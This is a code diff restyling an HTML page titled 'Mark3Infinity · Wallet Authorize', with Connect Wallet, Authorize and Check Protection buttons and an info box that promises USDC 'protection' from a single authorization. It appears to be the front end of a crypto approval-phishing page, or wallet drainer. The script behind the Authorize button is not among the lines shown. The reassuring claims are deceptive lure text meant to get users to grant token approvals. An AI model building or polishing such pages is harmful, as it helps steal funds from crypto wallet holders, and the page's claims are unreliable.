@@ -8,92 +8,117 @@
     body {
       margin: 0;
       font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(145deg, #0d1117, #1c1f26);
+      background: linear-gradient(135deg, #0f111a, #1c1e2d);
       color: white;
       display: flex;
       flex-direction: column;
       align-items: center;
       padding: 2rem;
     }
+    .card {
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(16px);
+      border-radius: 20px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+      padding: 2rem;
+      max-width: 480px;
+      width: 100%;
+      animation: fadeIn 1s ease;
+    }
     h2 {
-      margin-bottom: 1rem;
+      text-align: center;
+      margin-bottom: 1.2rem;
+      font-size: 1.8rem;
     }
     .button {
-      background: rgba(255, 255, 255, 0.08);
-      backdrop-filter: blur(10px);
-      border: 1px solid rgba(255, 255, 255, 0.2);
-      border-radius: 16px;
-      padding: 12px 30px;
-      font-size: 1rem;
+      width: 100%;
+      padding: 14px;
+      border-radius: 14px;
       font-weight: 600;
-      color: #fff;
-      margin: 10px;
+      font-size: 1rem;
+      margin: 8px 0;
+      background: linear-gradient(to right, #4e54c8, #8f94fb);
+      border: none;
       cursor: pointer;
-      transition: all 0.2s ease;
+      transition: all 0.3s ease;
+      color: white;
     }
     .button:hover {
-      background: rgba(255, 255, 255, 0.15);
-    }
-    #status {
-      margin-top: 1rem;
-      padding: 1rem;
-      background: #161b22;
-      border-radius: 10px;
-      width: 100%;
-      max-width: 600px;
-      font-size: 0.9rem;
-    }
-    .wallet-icons {
-      display: flex;
-      overflow-x: auto;
-      margin-top: 2rem;
-      gap: 1.5rem;
-      padding-bottom: 1rem;
-    }
-    .wallet-icons img {
-      height: 40px;
-    }
-    .deeplink, .copy-url {
-      margin-top: 1rem;
-      background: #2f3542;
-      color: #fff;
-      padding: 8px 20px;
-      border-radius: 10px;
-      font-size: 0.9rem;
+      filter: brightness(1.1);
     }
     .progress-bar {
-      margin-top: 20px;
-      height: 10px;
+      margin-top: 1rem;
       width: 100%;
-      max-width: 500px;
-      background: #333;
-      border-radius: 5px;
+      height: 10px;
+      background: #222;
+      border-radius: 6px;
       overflow: hidden;
     }
     .progress-inner {
       height: 100%;
-      background: #00adb5;
+      background: #4e54c8;
       width: 0%;
       transition: width 0.4s ease;
+    }
+    #status {
+      margin-top: 1rem;
+      padding: 1rem;
+      background: rgba(255,255,255,0.07);
+      border-radius: 10px;
+      font-size: 0.9rem;
+      text-align: center;
+    }
+    .wallet-logos {
+      display: flex;
+      gap: 1rem;
+      margin-top: 1rem;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+    .wallet-logos img {
+      height: 32px;
+      width: 32px;
+      border-radius: 8px;
+      background: white;
+      padding: 4px;
+    }
+    .info-box {
+      margin-top: 2rem;
+      font-size: 0.85rem;
+      background: rgba(255,255,255,0.06);
+      padding: 1rem;
+      border-radius: 12px;
+      text-align: left;
+      line-height: 1.5;
+    }
+    .info-box div {
+      margin-bottom: 0.5rem;
+    }
+    @keyframes fadeIn {
+      from {opacity: 0; transform: translateY(20px);}
+      to {opacity: 1; transform: translateY(0);}
     }
   </style>
 </head>
 <body>
-  <h2>Mark3Infinity · Wallet Authorize</h2>
-  <button class="button" id="connect">🔌 Connect Wallet</button>
-  <button class="button" id="authorize">🛡️ Authorize</button>
-  <button class="button" id="check">🧿 Check Protection</button>
-  <div class="progress-bar"><div class="progress-inner" id="bar"></div></div>
-  <div id="status">🔒 Status: Waiting for action...</div>
-
-  <div class="deeplink" id="deeplink"></div>
-  <div class="copy-url">📋 <button onclick="navigator.clipboard.writeText(window.location.href)">Copy this page link</button></div>
-
-  <div class="wallet-icons">
-    <img src="https://cryptologos.cc/logos/metamask-icon.svg" alt="MetaMask">
-    <img src="https://cryptologos.cc/logos/trust-wallet-trust-wallet-logo.svg" alt="TrustWallet">
-    <img src="https://cryptologos.cc/logos/token-pocket-tpt-logo.svg" alt="TokenPocket">
-    <img src="https://cryptologos.cc/logos/coinbase-coinbase-logo.svg" alt="Coinbase">
+  <div class="card">
+    <h2>Mark3Infinity · Wallet Authorize</h2>
+    <button class="button" id="connect">🔌 Connect Wallet</button>
+    <button class="button" id="authorize">🛡️ Authorize</button>
+    <button class="button" id="check">🧿 Check Protection</button>
+    <div class="progress-bar"><div class="progress-inner" id="bar"></div></div>
+    <div id="status">🔒 Status: Waiting for action...</div>
+    <div class="wallet-logos">
+      <img src="https://cryptologos.cc/logos/metamask-icon.svg" alt="MetaMask">
+      <img src="https://cryptologos.cc/logos/trust-wallet-trust-wallet-logo.svg" alt="TrustWallet">
+      <img src="https://cryptologos.cc/logos/token-pocket-tpt-logo.svg" alt="TokenPocket">
+      <img src="https://cryptologos.cc/logos/coinbase-coinbase-logo.svg" alt="Coinbase">
+    </div>
+    <div class="info-box">
+      <div>✅ Mark3 Protocol provides advanced wallet authorization and real-time USDC asset protection through smart contract-based automation.</div>
+      <div>✅ A single authorization grants continuous protection, allowing you to confidently operate your wallet without risk of unauthorized withdrawals or vulnerabilities.</div>
+      <div>✅ Trusted by power users, Mark3 is built with a decentralized logic core, fully verified on Ethereum, and optimized for scalable financial defense.</div>
+    </div>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
@@ -163,12 +188,6 @@
         progress(0);
       }
     };
-
-    // 检测钱包浏览器跳转提示
-    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-    if (isMobile && !window.ethereum) {
-      document.getElementById("deeplink").innerHTML = '🔁 <a href="https://metamask.app.link/dapp/' + window.location.hostname + '">Open in Wallet App</a>';
-    }
   </script>
 </body>
 </html>
